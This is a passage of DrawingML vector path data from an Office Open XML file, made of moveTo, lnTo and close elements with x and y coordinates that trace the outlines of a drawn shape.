                    <a:pt x="1614" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="13022"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13206" y="12949"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13169" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="12949"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2458" y="13646"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2641" y="13792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="13902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="13646"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3595" y="9794"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3558" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="9977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="12178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="14379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="14012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="12508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145" y="9977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="9794"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3155" y="14122"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3778" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="14489"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="14122"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12692" y="13536"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12619" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="14489"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="13536"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4035" y="14746"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4402" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="15076"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="14746"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11922" y="14489"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11885" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="14489"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4769" y="15223"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5026" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="15810"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="15883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="16287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="15773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="15223"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5833" y="15993"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6456" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="16580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="16690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="16323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="15993"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11298" y="15260"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11298" y="15443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="15957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="16067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="17130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="16984"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="16653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="15920"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="16067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="16287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="16543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="16543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="16470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="16360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="15260"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6566" y="16580"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7006" y="17020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="17240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="17460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="17350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="17130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="17020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="16800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="16580"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9464" y="404"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9684" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15443" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14856" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14856" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16727" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16984" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16470" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="12508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="13792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="15736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="17057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="17277"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="17497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="17350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="17204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="17094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="16910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="16727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="16067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="15296"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3668" y="7556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="404"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7227" y="17204"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7667" y="17460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="17681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="17937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="18194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="18084"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="17497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="17204"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9831" y="17460"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9868" y="17534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="17571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="18084"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="18231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="17937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="17937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="17827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="17681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="17460"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9464" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9281" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="11701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="12508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="17534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="17571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="17864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="18231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="18561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="18671"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="18854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="18854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="18818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="18744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="18634"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="18561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="18488"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="18414"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="18157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="17864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="17937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="18267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="18451"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="18598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="18854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="18964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="19001"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="18964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="18854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="18414"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="17717"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16214" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17314" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17791" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18011" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18231" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18304" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18341" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18378" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18378" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18268" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18158" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17828" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17644" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17424" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17277" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16910" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16837" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16800" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16800" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16727" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16470" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16360" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="5356"/>
                  </a:lnTo>
